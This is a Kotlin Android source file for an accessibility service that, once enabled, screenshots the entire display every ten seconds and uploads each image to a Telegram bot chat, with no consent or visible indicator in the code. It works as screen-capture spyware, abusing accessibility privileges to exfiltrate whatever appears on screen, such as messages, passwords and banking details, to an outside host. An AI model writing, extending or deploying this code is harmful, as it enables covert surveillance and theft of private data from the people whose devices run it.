package com.example.telegramsender

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.graphics.Bitmap
import android.os.Build
import android.util.Log
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import kotlinx.coroutines.*
import okhttp3.FormBody
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Request
import java.io.ByteArrayOutputStream
import java.io.IOException
import java.util.concurrent.Executor


class TelegramService : AccessibilityService() {

    private val client = OkHttpClient()
    private var job: Job? = null
    
    // Default credentials, will be loaded from Prefs
    private var botToken: String = ""
    private var targetChatId: String = ""

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d("TelegramService", "Accessibility Service Connected")
        
        loadCredentials()
        
        if (botToken.isNotEmpty() && targetChatId.isNotEmpty()) {
            startCaptureLoop()
            sendTelegramMessage(botToken, targetChatId, "Service Connected (Accessibility Mode)")
        } else {
            Log.e("TelegramService", "Credentials missing on connect")
        }
    }

    private fun loadCredentials() {
        val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
        botToken = pref.getString("token", "") ?: ""
        targetChatId = pref.getString("chatId", "") ?: ""
    }

    private fun startCaptureLoop() {
        job?.cancel()
        job = CoroutineScope(Dispatchers.IO).launch {
            while (isActive) {
                // Refresh credentials in case they changed
                loadCredentials()
                
                if (botToken.isNotEmpty() && targetChatId.isNotEmpty()) {
                    captureAndSend()
                }
                delay(10_000) // 10 seconds delay
            }
        }
    }

    private fun captureAndSend() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            takeScreenshot(
                Display.DEFAULT_DISPLAY,
                mainExecutor,
                object : TakeScreenshotCallback {
                    override fun onSuccess(screenshotResult: ScreenshotResult) {
                        val bitmap = try {
                            Bitmap.wrapHardwareBuffer(
                                screenshotResult.hardwareBuffer,
                                screenshotResult.colorSpace
                            )
                        } catch (e: Exception) {
                            Log.e("TelegramService", "Bitmap conversion failed", e)
                            null
                        }

                        screenshotResult.hardwareBuffer.close()

                        if (bitmap != null) {
                            // Copy to software bitmap to process/compress
                            val softwareBitmap = bitmap.copy(Bitmap.Config.ARGB_8888, false)
                            bitmap.recycle() // Recycle hardware wrapper
                            
                            if (softwareBitmap != null) {
                                CoroutineScope(Dispatchers.IO).launch {
                                    sendTelegramPhoto(botToken, targetChatId, softwareBitmap)
                                }
                            }
                        }
                    }

                    override fun onFailure(errorCode: Int) {
                        Log.e("TelegramService", "Screenshot failed: $errorCode")
                    }
                }
            )
        } else {
            Log.e("TelegramService", "Accessibility screenshots require Android 11+")
        }
    }
    
    private fun sendTelegramMessage(token: String, chatId: String, text: String) {
        val url = "https://api.telegram.org/bot$token/sendMessage"
        val body = FormBody.Builder()
            .add("chat_id", chatId)
            .add("text", text)
            .build()
        val request = Request.Builder().url(url).post(body).build()
        try {
            client.newCall(request).execute().use { }
        } catch (_: Exception) {}
    }

    private fun sendTelegramPhoto(token: String, chatId: String, originalBitmap: Bitmap) {
        val url = "https://api.telegram.org/bot$token/sendPhoto"
        
        // Resize if too big to avoid socket timeouts
        val scale = 720f / originalBitmap.width
        val matrix = android.graphics.Matrix()
        matrix.postScale(scale, scale)
        val resizedBitmap = Bitmap.createBitmap(originalBitmap, 0, 0, originalBitmap.width, originalBitmap.height, matrix, true)
        
        val stream = ByteArrayOutputStream()
        resizedBitmap.compress(Bitmap.CompressFormat.JPEG, 60, stream)
        val byteArray = stream.toByteArray()
        
        // Clean up
        originalBitmap.recycle()
        resizedBitmap.recycle()
        
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", chatId)
            .addFormDataPart("photo", "screenshot.jpg",
                byteArray.toRequestBody("image/jpeg".toMediaTypeOrNull(), 0, byteArray.size))
            .build()
            
        val request = Request.Builder().url(url).post(requestBody).build()
        
        try {
            client.newCall(request).execute().use { response -> 
                if (!response.isSuccessful) {
                    Log.e("TelegramService", "Failed to send photo: ${response.code}")
                } else {
                    Log.d("TelegramService", "Photo sent successfully (${byteArray.size} bytes)")
                }
            }
        } catch (e: IOException) {
            Log.e("TelegramService", "Network error", e)
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        // Not used, but required to override
    }

    override fun onInterrupt() {
        Log.w("TelegramService", "Service Interrupted")
        job?.cancel()
    }
    
    override fun onUnbind(intent: Intent?): Boolean {
        job?.cancel()
        return super.onUnbind(intent)
    }
}
